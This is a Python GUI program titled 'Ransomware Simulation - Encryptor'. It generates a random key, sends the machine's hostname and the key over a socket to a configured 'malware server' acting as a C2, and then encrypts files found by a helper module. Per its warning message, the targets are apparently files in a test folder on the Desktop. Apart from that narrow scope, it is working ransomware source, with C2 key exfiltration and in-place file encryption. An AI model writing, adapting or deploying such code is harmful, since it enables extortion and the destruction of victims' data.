import tkinter as tk
from tkinter import ttk, messagebox
import threading
import socket
import random
import os
import crypto_engine  # Imports the logic above

# Configuration
SERVER_IP = '192.168.0.103'  # Change to your malware server IP
SERVER_PORT = 5678


class EncryptorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Simulation - Encryptor")
        self.root.geometry("500x350")
        self.root.configure(bg="#2c3e50")

        # UI Elements
        self.label = tk.Label(root, text="Ransomware Simulation", font=("Arial", 16, "bold"), fg="white", bg="#2c3e50")
        self.label.pack(pady=20)

        self.status_label = tk.Label(root, text="Status: Idle", font=("Consolas", 10), fg="#ecf0f1", bg="#2c3e50")
        self.status_label.pack(pady=5)

        self.progress = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=20)

        self.start_btn = tk.Button(root, text="INITIATE ENCRYPTION", command=self.start_encryption,
                                   bg="#c0392b", fg="white", font=("Arial", 12, "bold"), height=2)
        self.start_btn.pack(pady=20)

    def log(self, message):
        self.status_label.config(text=f"Status: {message}")
        self.root.update_idletasks()

    def generate_key(self):
        chars = "abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ1234567890!@#$%"
        return "".join(random.choice(chars) for _ in range(64))

    def send_key(self, key):
        try:
            hostname = os.getenv('COMPUTERNAME')
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                s.send(f'{hostname} : {key}'.encode('utf-8'))
            return True
        except Exception as e:
            print(f"Server connection failed: {e}")
            return False

    def run_logic(self):
        self.start_btn.config(state="disabled")

        # 1. Locate Files
        self.log("Locating target files...")
        files = crypto_engine.get_target_files()
        if not files:
            messagebox.showwarning("Empty", "No files found in 'Ransomware_Test_Folder' on Desktop.")
            self.start_btn.config(state="normal")
            return

        # 2. Generate Key
        self.log("Generating 512-bit Key...")
        key = self.generate_key()

        # 3. Exfiltrate Key
        self.log("Contacting C2 Server...")
        sent = self.send_key(key)
        if not sent:
            # For demo purposes, we print the key if server fails so you don't lose data
            print(f"DEBUG: Server unreachable. Key is: {key}")

        # 4. Encrypt
        self.progress["maximum"] = len(files)
        for i, file in enumerate(files):
            self.log(f"Encrypting: {os.path.basename(file)}")
            crypto_engine.process_file_in_memory(file, key)
            self.progress["value"] = i + 1
            # Add a tiny delay just for visual effect in the demo
            self.root.after(50)

        self.log("Encryption Complete.")
        messagebox.showinfo("Done", "All files encrypted.\nCheck the C2 Server for the key.")

    def start_encryption(self):
        # Run in a separate thread to keep UI responsive
        threading.Thread(target=self.run_logic, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = EncryptorApp(root)
    root.mainloop()